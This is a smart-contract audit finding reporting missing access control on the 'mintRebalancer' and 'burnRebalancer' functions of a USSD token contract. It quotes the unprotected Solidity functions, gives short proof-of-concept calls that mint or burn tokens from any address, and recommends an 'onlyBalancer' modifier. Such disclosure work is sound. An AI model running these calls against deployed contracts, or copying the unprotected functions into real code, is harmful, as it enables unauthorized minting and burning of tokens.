# Lack of Access Control for "mintRebalancer" &"burnRebalancer" function

## Summary
Lack of Access Control for "mintRebalancer" &"burnRebalancer" functions may cause unauthorized minting & unauthorized burning 
## Vulnerability Detail
1) Lack of Access Control for "mintRebalancer" function
The "mintRebalancer" function does not have any access control modifiers, which means any address can call this function and mint tokens without any restrictions. Here's the vulnerable function:

```solidity
 function mintRebalancer(uint256 amount) public override {
        _mint(address(this), amount);
    }
```
### Proof of Concept:
Let's assume there is an attacker's address, attackerAddress, that wants to exploit the vulnerability and mint tokens. The attacker can simply call the "mintRebalancer" function with the desired amount of tokens:
```solidity 
// Attacker's address
address attackerAddress = msg.sender;

// Call the vulnerable function to mint tokens
USSD u = USSD(addressOfUSSDContract);
u.mintRebalancer(1000);
```
By executing this code, the attacker's address successfully mints 1000 tokens and increases the token supply without any authorization or control. 

2) Same goes for  Lack of Access Control for "burnRebalancer" function
The "burnRebalancer" function does not have any access control modifiers, which means any address can call this function and burn tokens without any restrictions. Here's the vulnerable function:

```solidity
  function burnRebalancer(uint256 amount) public override {
        _burn(address(this), amount);
    }
```
### Proof of Concept:
Let's assume there is an attacker's address, attackerAddress, that wants to exploit the vulnerability and burn tokens. The attacker can simply call the "burnRebalancer" function with the desired amount of tokens:
```solidity 
// Attacker's address
address attackerAddress = msg.sender;

// Call the vulnerable function to burn tokens
USSD u = USSD(addressOfUSSDContract);
u.burnRebalancer(500);
```
By executing this code, the attacker's address successfully burns 500 tokens from the contract's balance without any authorization or control.
## Impact
The consequences of unauthorized minting can include- Inflation, Devaluation & Disruption of Stability and for unauthorized burning it could include - Token Supply Reduction, Imbalanced Token Distribution & Loss of Value.

## Tool used

Manual Review

## Recommendation
The "onlyBalancer" modifier should be implemented for `mintRebalancer` & `burnRebalancer` as:
```solidity
 function mintRebalancer(uint256 amount) public override onlyBalancer {
        _mint(address(this), amount);
    }

 function burnRebalancer(uint256 amount) public override onlyBalancer  {
        _burn(address(this), amount);
    }
```
